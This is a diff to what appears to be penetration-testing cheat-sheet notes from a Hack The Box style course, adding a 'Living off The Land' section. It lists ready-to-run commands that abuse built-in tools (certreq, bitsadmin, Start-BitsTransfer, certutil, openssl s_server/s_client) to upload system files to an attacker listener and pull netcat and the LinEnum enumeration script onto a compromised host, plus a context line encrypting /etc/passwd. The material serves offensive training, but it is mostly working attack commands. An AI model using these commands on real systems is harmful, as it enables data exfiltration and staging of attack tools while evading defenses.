@@ -513,3 +513,43 @@ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
 # decrypt
 openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
 ```
+
+# Living off The Land
+
+- https://lolbas-project.github.io/
+
+## Windows
+
+```powershell
+# upload (listen on linux -> sudo nc -lvnp 8000)
+certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
+```
+
+### Bitsadmin Download
+
+```powershell
+# cmd
+bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
+
+# powershell
+Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+```
+
+### Certutil Download
+
+```bash
+certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+certutil -urlcache -f url out.txt
+```
+
+## Linux
+
+```bash
+# create cert
+openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+# setup server
+openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+
+# download
+openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+```
